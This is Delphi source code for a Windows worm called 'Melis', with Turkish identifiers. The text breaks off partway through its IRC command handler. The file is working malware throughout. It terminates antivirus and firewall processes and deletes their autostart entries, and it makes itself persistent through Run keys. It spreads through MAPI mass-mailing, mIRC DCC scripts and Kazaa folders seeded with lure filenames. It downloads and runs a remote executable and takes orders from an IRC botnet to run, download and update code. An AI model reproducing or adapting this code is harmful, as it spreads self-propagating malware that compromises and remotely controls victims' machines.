   ////////////////////////////////////////////////////////////////////////////////
   // Melis - Internet Worm
   // Version    : 1.0
   // Start Date : 13.10.02
   //
   // Copyright  : Ronop Programming and Security Group
   //              http://www.ronop.com     mailto:admin@ronop.com
   ////////////////////////////////////////////////////////////////////////////////
   program Melis;

   uses
     Windows,
     Winsock,
     Api,
     Strfunc,
     Urlmon,
     Mapi,
     KayitDuzen,
     SysUtils,
     TlHelp32,
     Messages;

   var
    WSAData: TWSAData;
    S: TSocket;
    HedefAdres: TSockAddrIn;
    Buf: array[0..1024] of Char;
    C1,S1,Concheck,Exint,Tempint,Rpt: Integer;
    TmpRcv, Copytmp,
    Mkanal,Mnick,Mmesaj,
    Currentdizin,ExeName,
    Regowner,Owner,Version,
    Uname,Id,Dom,Ext,Nick,
    WormDurum,Executed,Txtz,
    Onjmsg,Randomip,
    Gelen,Icerik,Parametre:String;
    Dosya1Uz,Sonuc1,Sonuc2,KaynakDosya:String;
    Hhost: pchar;
    HndKey: HKey;
    Dhost: dword;
    Os: TOSVersionInfo;
    Komut:Integer;
    Buffer:Pointer;BufSize:Integer;
    Deger:Integer;
    hmIRC,hMDIClient,hmIRC_Status,child  :    Hwnd;
    FileMap                              : THandle;
    FmData                               :   Pchar;
      AvName : array [1..34] of String =(
   'AVPCC',
   'AVPCC Service',
   'BlackIce Utility',
   'F-StopW',
   'McAfee Firewall',
   'McAfee Winguage',
   'McAfee.InstantUpdate.Monitor',
   'McAfeeVirusScanService',
   'McAfeeWebscanX',
   'McAgentExe',
   'McUpdateExe',
   'NAV Agent',
   'NAV Configuration Wizard',
   'NAV DefAlert',
   'NB Common Dialog Enhancements',
   'NB Start Menu',
   'NB Windows Patterns',
   'Norton Auto-Protect',
   'Norton eMail Protect',
   'Norton Navigator Loader',
   'Norton Program Scheduler',
   'Norton Program Scheduler Event Checker',
   'NPS Event Checker',
   'Panda Scheduler',
   'PP2000 Instaupdate',
   'PP2000 Real Time Scan',
   'PP2000 Taskbar Control',
   'SymTray - Norton SystemWorks',
   'Tiny Personal Firewall',
   'TrendMicro Antivirus',
   'TrueVector',
   'WinProxy',
   'ZoneAlarm',
   'ZoneAlarm Pro'
   );
   const
   WM_MEVALUATE = WM_USER + 201;
   WM_MCOMMAND = WM_USER + 200;
   ProcessList =
    '*ZONEALARM.EXE*WFINDV32.EXE*WEBSCANX.EXE*VSSTAT.EXE*VSHWIN32.EXE*VSECOMR.EXE*VSCAN40.EXE*VETTRAY.EXE*VET95.EXE*TDS2-NT.EXE*'+
    '*TDS2-98.EXE*TCA.EXE*TBSCAN.EXE*SWEEP95.EXE*SPHINX.EXE*SMC.EXE*SERV95.EXE*SCRSCAN.EXE*SCANPM.EXE*SCAN95.EXE*SCAN32.EXE*SAFEWEB.EXE*'+
    '*RESCUE.EXE*RAV7WIN.EXE*RAV7.EXE*PERSFW.EXE*PCFWALLICON.EXE*PCCWIN98.EXE*PAVW.EXE*PAVSCHED.EXE*PAVCL.EXE*PADMIN.EXE*OUTPOST.EXE*NVC95.EXE*'+
    '*NUPGRADE.EXE*NORMIST.EXE*NMAIN.EXE*NISUM.EXE*NAVWNT.EXE*NAVW32.EXE*NAVNT.EXE*NAVLU32.EXE*NAVAPW32.EXE*N32SCANW.EXE*MPFTRAY.EXE*MOOLIVE.EXE*'+
    '*LUALL.EXE*LOOKOUT.EXE*LOCKDOWN2000.EXE*JEDI.EXE*IOMON98.EXE*IFACE.EXE*ICSUPPNT.EXE*ICSUPP95.EXE*ICMON.EXE*ICLOADNT.EXE*ICLOAD95.EXE*IBMAVSP.EXE*'+
    '*IBMASN.EXE*IAMSERV.EXE*IAMAPP.EXE*FRW.EXE*FPROT.EXE*FP-WIN.EXE*FINDVIRU.EXE*F-STOPW.EXE*F-PROT95.EXE*F-PROT.EXE*F-AGNT95.EXE*ESPWATCH.EXE*ESAFE.EXE*'+
    '*ECENGINE.EXE*DVP95_0.EXE*DVP95.EXE*CLEANER3.EXE*CLEANER.EXE*CLAW95CF.EXE*CLAW95.EXE*CFINET32.EXE*CFINET.EXE*CFIAUDIT.EXE'+
    '*CFIADMIN.EXE*BLACKICE.EXE*BLACKD.EXE*AVWUPD32.EXE*AVWIN95.EXE*AVSCHED32.EXE*AVPUPD.EXE*AVPTC32.EXE*AVPM.EXE*AVPDOS32.EXE*AVPCC.EXE*AVP32.EXE*AVP.EXE*'+
    '*AVNT.EXE*AVKSERV.EXE*AVGCTRL.EXE*AVE32.EXE*AVCONSOL.EXE*AUTODOWN.EXE*APVXDWIN.EXE*ANTI-TROJAN.EXE*ACKWIN32.EXE*_AVPM.EXE*_AVPCC.EXE*REGEDIT.EXE*';
   function RegisterServiceProcess (dwProcessID, dwType: DWord) : DWord; stdcall; external 'KERNEL32.DLL';
   Label Dongu1;



   //--------------------------------------------------
    // Dosya yoksa indir ve çalýþtýr kodu. uses urlmon

   function DownloadFile(Source, Dest: string): Boolean;
   begin
     try
       Result :=  UrlDownloadToFile(nil, PChar(source), PChar(Dest), 0, nil) = 0;
     except
       Result := False;
     end;
   end;
   //-------------------------------------------------------
   Function Windizin:String;
   Var
   Windir:Pchar;
   Begin
    Getmem(Windir,100);
    GetWindowsDirectory(Windir,100);
    Result:=Windir+'\';
    Freemem(Windir);
   End;
   //-------------------------------------------------------
    function SendString(sendstring: string): string;
     var
      Buf1: string;
     begin
      Buf1 := sendstring;
      Send(S, Buf1[1], Length(Buf1), 0);
     end;
   //-------------------------------------------------------
   Function ikiAraOku(okunan ,bas, son : AnsiString): AnsiString;
   Begin
     Result:=Copy(Okunan, Pos(bas, okunan)+(Length(bas)), (Pos(son, okunan)- Pos(bas, okunan))-Length(Son) );
   End;
   //-------------------------------------------------------
   Function RunItPlease(RunDosya:String;Parametre:Boolean):String;
   Begin
    If Parametre Then
    Exint:= Winexec(Pchar(RunDosya),SW_NORMAL)
    Else
    Exint:= Winexec(Pchar(RunDosya),SW_HIDE);
    If Exint > 31 Then
    Result:=':: '+RunDosya+' Running Successful.'
    Else
    Result:=':: '+RunDosya+' Running Failed.';
   End;
   //-------------------------------------------------------
   Procedure WindowsKapat(Parametre1:Integer);
   Begin
    Case Parametre1 Of
     1: ExitWindows(EW_RESTARTWINDOWS,0);
     2: ExitWindows(EW_REBOOTSYSTEM,0);
     3: ExitWindowsEx(EWX_REBOOT,0);
     4: ExitWindowsEx(EWX_SHUTDOWN,0);
     5: ExitWindowsEx(EWX_FORCE,0);
     6: ExitWindowsEx(EWX_POWEROFF,0);
    End;
   End;
   //-------------------------------------------------------
   function KillTask(ExeFileName: string): Integer;
   const
     PROCESS_TERMINATE = $0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     Result := 0;
     FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

     while Integer(ContinueLoop) <> 0 do
     begin
       if ((UpperCase(String(FProcessEntry32.szExeFile)) =
         UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
         UpperCase(ExeFileName))) then
         Result := Integer(TerminateProcess(
                           OpenProcess(PROCESS_TERMINATE,
                                       BOOL(0),
                                       FProcessEntry32.th32ProcessID),
                                       0));
        ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
     end;
     CloseHandle(FSnapshotHandle);
   end;
   //-------------------------------------------------------
   Procedure AvFwKill;
   var
     Proc   : TProcessEntry32;
     Snap   : THandle;
     Kelime : String;
   Begin
     Snap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS,0);
     Proc.dwSize := SizeOf(TProcessEntry32);
     Process32First(Snap,Proc);
     Repeat
      Kelime:=String(Proc.szExeFile);
      If Pos('*'+UpperCase(Kelime)+'*',ProcessList) <> 0 Then Begin Killtask(Kelime); Sleep(1000); End;
     Until (not Process32Next(Snap,Proc));

   end;
   Procedure KayitSil;
   Var
   Hndkey: hkey;
   P: integer;
   Begin
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    'Software\Microsoft\Windows\CurrentVersion\Run',
    1,KEY_ALL_ACCESS,HndKey);

   For P:=1 To 34 Do
   RegDeleteValue(hndKEy,PChar(AvName[p]));

   RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    'Software\Microsoft\Windows\CurrentVersion\RunServices',
    1,KEY_ALL_ACCESS,HndKey);

   For p:=1 To 34 Do
   RegDeleteValue(hndKEy,PChar(AvName[p]));

   RegCloseKey(hndKey);
   end;
   //-------------------------------------------------------
   Function DosyaIndir(Icerik1:String;Parametre2:Integer):String;
   Var
   RemoteDosya,LocalDosya:String;
   Begin
   RemoteDosya:=Gettok(Icerik1,1,32);
   LocalDosya:=Gettok(Icerik1,2,32);
   If DownloadFile(RemoteDosya,LocalDosya) Then
   Begin
    Result:=':: '+RemoteDosya+' Downloaded.';
    If Parametre2=1 Then RunItPlease(LocalDosya,True);
    End
    Else
    Result:=':: '+RemoteDosya+' Download Failed.';
   End;
   //-------------------------------------------------------
   //-------------------------------------------------------
   //-------------------------------------------------------
   Procedure MailAt;
   Var
    MAPIMessage: TMAPIMessage;
    lppMapiMessage: PMapiMessage;
    Recip: TMapiRecipDesc;
    msgFile: TMapiFileDesc;
    MError: Cardinal;
    MapiSession, iMinusOne, i: LongInt;
    bWinNT, bFindFirst: Boolean;
    ProfileName, sAddress,sSentMail: String;
    sSeedMessageID, sMessageID: array[0..512] of Char;

   Begin
   os.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
   GetVersionEx(os);
   bWinNT := (os.dwPlatformId = VER_PLATFORM_WIN32_NT);
   if (bWinNT) then
    ProfileName := regReadString(HKEY_CURRENT_USER,
    'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles',
    'DefaultProfile')
   else
   ProfileName := regReadString(HKEY_CURRENT_USER,
   'Software\Microsoft\Windows Messaging Subsystem\Profiles', 'DefaultProfile');
   iMinusOne := -1;
   sSentMail := '';
     try
       MError := MapiLogOn(0, PChar(ProfileName), nil, MAPI_NEW_SESSION, 0, @MapiSession);
       if (MError <> SUCCESS_SUCCESS) then
         Exit;
     except
       ;
     end;
   with msgFile do
   begin
    ulReserved := 0;
    flFlags := 0;
    nPosition := iMinusOne;
    lpszPathName := PChar(Windizin+'Lianne.scr');
    lpszFileName := nil;
    lpFileType := nil;
   end;

   bFindFirst := True;
    for i := 1 to 50 do
    try
     if (bFindFirst) then
     begin
      sSeedMessageID := '';
      bFindFirst := False;
     end
     else
     sSeedMessageID := sMessageID;
     MError := MapiFindNext(MapiSession, 0, nil, @sSeedMessageID, 0, 0, @sMessageID);
     if (MError = SUCCESS_SUCCESS) then
     begin
     lppMapiMessage := @MAPIMessage;
     MError := MAPIReadMail(MAPISession, 0, @sMessageID,
     MAPI_ENVELOPE_ONLY, 0, lppMapiMessage);
   if (MError = SUCCESS_SUCCESS) and (lppMapiMessage.lpRecips <> nil) then
    begin
    with Recip do
    begin
    ulReserved := 0;
    ulRecipClass := MAPI_TO;
    sAddress := 'SMTP:' + lppMapiMessage.lpRecips.lpszAddress;
    lpszAddress := Pchar(sAddress);
    lpszName := lppMapiMessage.lpRecips.lpszName;
    ulEIDSize := 0;
    lpEntryID := nil;
   end;
    FillChar(MAPIMessage, SizeOf(MAPIMessage), 0);
   with MapiMessage do
   begin
             ulReserved := 0;
             lpszSubject := PChar('Re:');
             lpszNoteText := PChar(Txtz);
             lpszMessageType := nil;
             lpszDateReceived := nil;
             lpszConversationID := nil;
             flFlags := 0;
             lpOriginator := nil;
             nRecipCount := 1;
             lpRecips := @Recip;
             nFileCount := 1;
             lpFiles := @msgFile;
   end;
    if (Pos(lppMapiMessage.lpRecips.lpszAddress, sSentMail) = 0) then
    begin
    MError := MapiSendMail(MapiSession, {handle}0, MapiMessage, 0, 0);
    sSentMail := sSentMail + lppMapiMessage.lpRecips.lpszAddress;
           end;

         end;
       end;
     except
       ;
     end;

     try
       MError := MapiLogOff(MapiSession, 0, 0, 0);
     except
       ;
     end;

   end;
   //--- mIRC Infection
   function StrCopy(Dest: PChar; const Source: PChar): PChar;
   asm
           PUSH    EDI
           PUSH    ESI
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     ECX,0FFFFFFFFH
           XOR     AL,AL
           REPNE   SCASB
           NOT     ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,ECX
           MOV     EAX,EDI
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EDX
           AND     ECX,3
           REP     MOVSB
           POP     ESI
           POP     EDI
   end;
   //-
   Procedure ScriptYarat;
   var
   Dosya :File;
   i :Integer;
   MScript :String;
   Begin
   //-
   MScript:=
   'On *:Text:*:?:{'+#13+#10+
   'If ($len(%enayi. [ $+ [ $nick ] ]) = 0) { set %enayi. [ $+ [ $nick ] ] 1 }'+#13+#10+
   'If (%enayi. [ $+ [ $nick ] ] = 1) { inc %enayi. [ $+ [ $nick ] ] '+'| .msg $nick YUUUH! hulya avsarin verdigi frikige bak!! kesin kaya bunun bacagina sikacak 2 kursun!!! http://www.voodoorush.com/hulya_avsar001.jpg0,0.pif | set %enayi. [ $+ [ $nick ] ] 2 }'+#13+#10+
   '}'+#13+#10+
   'On *:Start:{ unset %enayi.* }'+#13+#10+
   'Alias Gonder {'+#13+#10+
   ' /Dcc Send $1 '+Windizin+'Lianne.Scr }'+#13+#10+
   'on 1:Join:#: {'+#13+#10+
   ' If ( $nick == $me ) Halt '+#13+#10+
   ' Else Gonder $nick }';
   //-
   AssignFile (Dosya,Windizin+'Mscript.exe');
   Rewrite(Dosya,1);
   For i:=1 To Length(MScript) Do
    BlockWrite(Dosya,MScript[i],SizeOf(MScript[i]));
    Closefile(Dosya);
   End;
   //---
   Procedure MircBulas;
   Begin
   Try
    hmIRC := FindWindow('mIRC',nil);
    hMDIClient:=FindWindowEx(hmIRC,child,'MDIClient',nil);
    hmIRC_Status:=FindWindowEx(hMDIClient,child,'mIRC_Status',nil);

   FileMap:=CreateFileMapping(INVALID_HANDLE_VALUE,NIL,PAGE_READWRITE,0,4096,'mIRC');
   FmData := MapViewOfFile(FileMap,FILE_MAP_ALL_ACCESS,0,0,0);
   StrCopy(FmData,pchar('/.load -rs '+Windizin+'Mscript.exe'));
   SendMessage(hmIRC_Status,WM_MCOMMAND,5,0);
   //UnmapViewOfFile(@FmData);
   CloseHandle(FileMap);
   Except
   End;
   End;
   ///////////////////////////////////
   Procedure Indir;
   var
   Dosya:File;
   Begin
   AssignFile(Dosya, (Windizin+'Temp\security.exe'));
   {$i-} Reset(Dosya);
    if ioResult<>0 then Begin
     if DownloadFile('http://www.kamerali.com/kit/security.exe', (Windizin+'Temp\security.exe') ) then
     begin
      WinExec(pchar(Windizin+'Temp\security.exe'),SW_SHOW);
     end;
    Exit;
   {$i+}
   end;
   CloseFile(Dosya);
   end;
   //-------------------------------------------------------
   Procedure KayitAyarlari(Value:Boolean);
   Begin
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
    1,KEY_ALL_ACCESS,HndKey);
   Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);Buffer:=@Deger;
   RegSetValueEx(hndKey,'DisableRegistryTools',0,REG_DWORD,@Deger,BufSize);
   RegSetValueEx(hndKey,'NoDispCPL',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);
   End;
   //-------------------------------------------------------
   Procedure Parcala(Uz1 :Integer; KaynakDosya, Cikti1, Cikti2: String);
   Var
   FromF,ToF1,ToF2:File;
   Okunan,Yazilan,Tmp:Integer;
   Buf: array[1..1] of Char;
   Begin
   AssignFile(FromF, KaynakDosya);
   Reset(FromF, 1);

   AssignFile(ToF1, Cikti1);
   ReWrite(ToF1, 1);

   AssignFile(ToF2, Cikti2);
   Rewrite(ToF2, 1);

   Tmp:=0;
     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       BlockWrite(ToF1, Buf, Okunan, Yazilan);
       Tmp:=Tmp+Yazilan;
     until (Yazilan = 0) or (Yazilan <> Okunan) or (Tmp>Uz1-1);

     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       BlockWrite(ToF2, Buf, Okunan, Yazilan);
     until (Okunan = 0) or (Yazilan <> Okunan);

     CloseFile(ToF1);
     CloseFile(ToF2);
     CloseFile(FromF);
   End;
   //-------------------------------------------------------
   Function Bulasmismi(HedefDosya:String):Boolean;
   Var
    Dosya1S:String;
    Dosya1F,Dosya2F:File;
    Okunan1,Okunan2:Array[0..2048] of Byte;
    i:Integer;
    Uygun:Boolean;
   Begin
    FileMode:=2;
   {$I-}
    AssignFile(Dosya1F, HedefDosya);
    Reset(Dosya1F, 1);
    CloseFile(Dosya1F);
   {$I+}
    Uygun:= (IOResult = 0) and (HedefDosya <> '');
    FileMode:=0;
    If Uygun=True Then
    Begin
     Dosya1S:=Windizin+'Lianne.Scr';
     AssignFile(Dosya1F, HedefDosya);
     Reset(Dosya1F, 1);
     AssignFile(Dosya2F, Dosya1S);
     Reset(Dosya2F, 1);

     BlockRead(Dosya1F,Okunan1,SizeOf(Okunan1));
     BlockRead(Dosya2F,Okunan2,SizeOf(Okunan2));

     For i:=0 To 2048 Do
      Begin
       If Okunan1[i] <> Okunan2[i] Then
        Begin
         Result:=False;
         Break;
        End
        Else
         Result:=True;
      End;
       CloseFile(Dosya1F);
       CloseFile(Dosya2F);
    End
    Else
    Result:=True;
   End;
   //-------------------------------------------------------
   Procedure Birlestir(Dosya2S:String);
   Var
    Dosya1S,HedefDosya1:String;
    Dosya1,Dosya2,HedefDosya:File;
    Okunan,Yazilan:Integer;
    Buf: array[1..2048] of Char;
   Begin
    Dosya1S:=Windizin+'Lianne.Scr';
    CopyFile(pchar(ParamStr(0)),Pchar(Dosya1S), FALSE);
    HedefDosya1:=Dosya2S+'~';

    AssignFile(Dosya1, Dosya1S);
    Reset(Dosya1, 1);
    AssignFile(Dosya2, Dosya2S);
    Reset(Dosya2, 1);
    AssignFile(HedefDosya, HedefDosya1);
    Rewrite(HedefDosya, 1);

    Repeat
     BlockRead(Dosya1, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);
    Repeat
     BlockRead(Dosya2, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);

    CloseFile(HedefDosya);
    CloseFile(Dosya1);
    CloseFile(DOsya2);

   End;
   //-------------------------------------------------------
   Procedure KazaaInfect;
   var
   DlDir0,DlDir1:String;
   Value:Boolean;
   Begin
   DlDir0:=regReadString(HKEY_CURRENT_USER,
    'Software\Kazaa\Transfer',
    'DlDir0');
   DlDir1:=regReadString(HKEY_CURRENT_USER,
    'Software\Kazaa\LocalContent',
    'DownloadDir');
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'Software\Kazaa\LocalContent',
    1,KEY_ALL_ACCESS,HndKey);
   Value:=False;Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);Buffer:=@Deger;
   RegSetValueEx(hndKey,'DisableSharing',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);

   If DlDir0<>'' then
   Begin
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\Norton Antivirus 2003 Professional Edition.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\Norton Internet Security 2003 Professional.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\Windows XP Key Generator.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\Windows XP Keygen.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\Icq Hack.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\Hotmail Hack.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\Spy Cam - Girl Masterbating.scr'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir0+'\PornStar in Hardcore Action.scr'), FALSE);
   End;
   If DlDir1<>''  then
   Begin
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir1+'\WarCraft 3 Battle.net Key Generator.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir1+'\WarCraft 3 MapHack.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir1+'\StarCraft Battle.net Keygen.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir1+'\StarCraft Maphack.exe'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir1+'\HardCore Action In The School.scr'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir1+'\HardCore - College Webcam.scr'), FALSE);
   CopyFile(pchar(Windizin+'WinCfg32.exe'),pchar(DlDir1+'\Penis Enlargement Secrets.scr'), FALSE);
   End;
   End;
   //-------------------------------------------------------
   Procedure WindowsBilgileri;
   Var
   Degisken:Pwidechar;
   Begin
   Getmem(Degisken, 2048);
   Reg_ReadString(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion','RegisteredOwner',Degisken,1);
   Regowner:=SliceToString(Degisken);
   Freemem(Degisken);
   End;
   //------------AutoStart----------------------------------
   Function AutoStart(WormLocation:String):String;
   Var
   StartKlasor:String;
   Begin
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\Run',1,KEY_ALL_ACCESS,HndKey);
   RegSetValueEx(hndKey,'WinCfg32',0,REG_SZ,Pchar(WormLocation),Length(WormLocation));
   RegCloseKey(hndKey);

   {StartKlasor:=regReadString(HKEY_CURRENT_USER,
    'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',
    'Startup');
   If StartKlasor<>'' Then CopyFile(pchar(WormLocation),pchar(StartKlasor+'\Windows Loader.exe'), FALSE);
   }

   RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                        'Software\Mirabilis\ICQ\Agent\Apps\IcqWinCfg',
                        0,nil,REG_OPTION_VOLATILE,
                        Key_All_Access,nil,HndKey,
                        0);
   RegSetValueEx(hndKey,'Enable',0,REG_SZ,Pchar('Yes'),3);
   RegSetValueEx(hndKey,'Parameters',0,REG_SZ,Pchar(''),0);
   RegSetValueEx(hndKey,'Path',0,REG_SZ,Pchar(WormLocation),Length(WormLocation));
   RegSetValueEx(hndKey,'Startup',0,REG_SZ,Pchar(''),0);
   RegCloseKey(hndKey);
   End;
   //----------------W0rm Update----------------------------
   Function WormUpdate(WormYeri:string):BooLean;
   var
   WormAdi:String;
   begin
    Randomize;
    WormAdi:=(Random1(6)+'.exe');
    If DownloadFile( WormYeri,Windizin+WormAdi ) then
    Begin
    AutoStart(Windizin+WormAdi+' 1');
    ExitWindows(EW_RESTARTWINDOWS,0);
    End;
   End;

   //-------------------------------------------------------
   //-------------------------------------------------------
   //------------------VAR,FUNC,PROC SONU!!!!!--------------
   //-------------CODE BURADAN BA$LIYOOOOOO!!!!!!!----------

   begin


     Os.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
     GetVersionEx(Os);
     If Os.dwPlatformId  = VER_PLATFORM_WIN32_NT then
     SystemParametersInfo(SPI_SCREENSAVERRUNNING,1,nil,0)
     Else
     Begin
            try
             {$IFDEF WIN9X}
              RegisterServiceProcess(GetCurrentProcessID, 1);
             {$ENDIF}
            except
            end;
    End;

   CurrentDizin:=Paramstr(0);
   For S1:=Length(CurrentDizin) Downto 1 Do
    If CurrentDizin[S1] = '\' Then
     Begin
      ExeName:=copy(currentdizin,S1+1,100);
      CurrentDizin:=copy(CurrentDizin,1,S1);
      Break;
     End;

   If ParamStr(1) = '1' then
   Begin
      CopyFile(pchar(ParamStr(0)),pchar(Windizin+'WinCfg32.exe'), FALSE);
      AutoStart(Windizin+'WinCfg32.exe');
      WinExec(pchar(Windizin+'WinCfg32.exe'),SW_SHOW);
      Exit;
   End;
   If ParamStr(1) = '2' then
   Begin
      AutoStart(ParamStr(0)+' 1');
      ExitWindows(EW_RESTARTWINDOWS,0);
   End;

   CreateMutex(nil,TRUE,pchar(ExeName));
   if GetLastError = ERROR_ALREADY_EXISTS then
   begin
     Halt(0);
   end;

   AutoStart(ParamStr(0));
   KayitSil;
   AvFwKill;
   //
   Sonuc1:=Windizin+'WinCfg32.exe';
   Sonuc2:=Windizin+'Temp\HedefDosya.exe';
   KaynakDosya:=Windizin+'Temp\KaynakDosya.exe';
   Dosya1Uz:='29184';
   //

   If ParamStr(0) <> Windizin+'WinCfg32.exe' then begin
      If FileExists(Sonuc2) Then DeleteFile(Sonuc2);
      CopyFile(pchar(ParamStr(0)),Pchar(KaynakDosya), False);
      Parcala(StrToint(Dosya1Uz), KaynakDosya, Sonuc1, Sonuc2);
      DeleteFile(KaynakDosya);
      WinExec(pchar(Windizin+'WinCfg32.exe'),SW_SHOW);
      WinExec(pchar(Sonuc2),SW_SHOW);
      Exit;
   End;

   CopyFile(pchar(ParamStr(0)),pchar(Windizin+'Lianne.scr'), FALSE);
   KazaaInfect;
   ScriptYarat;
   AutoStart(ParamStr(0));
   KayitAyarlari(True);
   If Bulasmismi('C:\VictimFile.exe') = False Then
   Birlestir('C:\VictimFile.exe');

   //------------------------------------------------//
   //REAL CODE BURDAN BA$LIYO!!!!!!!!!!!!!!!!!!!!!!!!!
   //------------------------------------------------//

   Dongu1:
    Randomize;
    Randomip:='212.154.8.60';
    Concheck:=1;

    WSAStartUp($0101, WSAData);
    S := Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    HedefAdres.sin_family := AF_INET;
    HedefAdres.sin_port := htons(6667);
    HedefAdres.sin_addr.S_addr := inet_addr(pchar(randomip));
    If Connect(S, HedefAdres, Sizeof(HedefAdres)) = - 1 Then
     Begin
      Sleep(15000);
      goto Dongu1;
     End;
     Txtz:='I Hope you reply me. Thank you very much for reading my msg Bye.';
     MailAt;
     MircBulas;
     Indir;
     Nick:=  Random1(6);
     Uname:= Random1(5);
     Dom:=   Random1(5);
     Ext:=   Random1(3);
     Id:=    Random1(4);

     SendString('user ' +Id+' '+Uname+' '+Uname+' '+ ':'+Id+'@'+Dom+'.'+Ext+ #13#10 );
     SendString('nick ' + Nick + #13);

     Repeat
      Accept(S, nil, nil);
     Until S <> Invalid_Socket;

     While S <> Invalid_Socket Do
      Begin
      If (Recv(S, Buf, 1024, 0) <> 0) Then
       begin
        TmpRcv := buf;
        If Length(TmpRcv) > 0 then  Concheck:=Concheck+1;


   Mnick:=Copy(Gettok(Buf,1,Ord('!')),2,100);
   If (Lowercase(Gettok(Buf,2,32)) = 'join') and (onjmsg<>'') Then Sendstring('PRIVMSG '+Mnick+' :'+Onjmsg+#13+#10);
   If (Lowercase(Gettok(Buf,2,32)) = '376')  Then Sendstring('join #lianne'+#13+#10);

     // KANALDA VERÝLEN KOMUTLAR VE CASE SENSITIVE

   If Gettok(Buf,2,32) = 'PRIVMSG' Then
    Begin
    Rpt:=1;
    Mnick:= Copy(Gettok(Buf,1,Ord('!')),2,100);
    Mkanal:=Gettok(buf,3,32);
    Mmesaj:=Copy(Buf,Pos(' :',buf)+2,1000);
    Mmesaj:=Copy(Mmesaj,1,Length(Mmesaj)-2);
     If Lowercase(Gettok(Mmesaj,1,32)) = '!delay' Then
      Begin
       Sleep(StrtoInt(Gettok(Mmesaj,2,32)));
       Mmesaj:=Copy(Mmesaj,Pos(Gettok(Mmesaj,3,32),Mmesaj),1000);
      End;
     If LowerCase(Gettok(Mmesaj,1,32)) = '!repeat' Then
      Begin
       Rpt:=StrtoInt(Gettok(Mmesaj,2,32));
       Mmesaj:=Copy(Mmesaj,Pos(Gettok(Mmesaj,3,32),Mmesaj),1000);
      End;
   //--
   For Tempint:=1 to Rpt do begin
   //  ~ [1](Icerik){Parametre}
     Gelen:=Mmesaj;
     Komut:=StrToInt(ikiAraOku(Gelen, '[', ']'));
     Icerik:=ikiAraOku(Gelen, '(',')');
     Parametre:=ikiAraOku(Gelen, '{','}');



   Case Komut Of
   1:
    Begin
     Os.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
     GetVersionEx(Os);
     If Os.dwPlatformId  = VER_PLATFORM_WIN32_NT then version := 'Windows 2k/XP' else version:='Windows 9x/Me';
     Getmem (Hhost,100);
     Dhost := 100;
     GetUsername(Hhost,Dhost);
     Owner := PChar(Hhost);
     Freemem(Hhost,100);
     WindowsBilgileri;
     SendString ('PRIVMSG '+mkanal+' : .: 12[1 '+Owner+' - '+Regowner+' / '+Version+' | '+Windizin+' 12] 1| 12[1 '+Getips +' 12]1 :. '+#13+#10);
    End;
   2: WindowsKapat(StrToInt(Parametre));
   3:
    Begin
     Executed:=RunItPlease(Icerik,True);
     Sendstring('PRIVMSG '+Mkanal+' :'+Executed+' '+#13+#10);
    End;
   4:
    Begin
     Executed:=RunItPlease(Icerik,False);
     Sendstring('PRIVMSG '+Mkanal+' :'+Executed+' (Hidden) '+#13+#10);
    End;
   5:
    Sendstring('PRIVMSG '+Mkanal+' :'+DosyaIndir(Icerik,StrToInt(Parametre))+#13+#10);
   6:
    Sendstring(Icerik+#13);
   7:
    Begin
     If WormUpdate(Icerik) Then
      Begin
       WormDurum:='Oh Yeah ! Thnx For Refreshing w0rm';
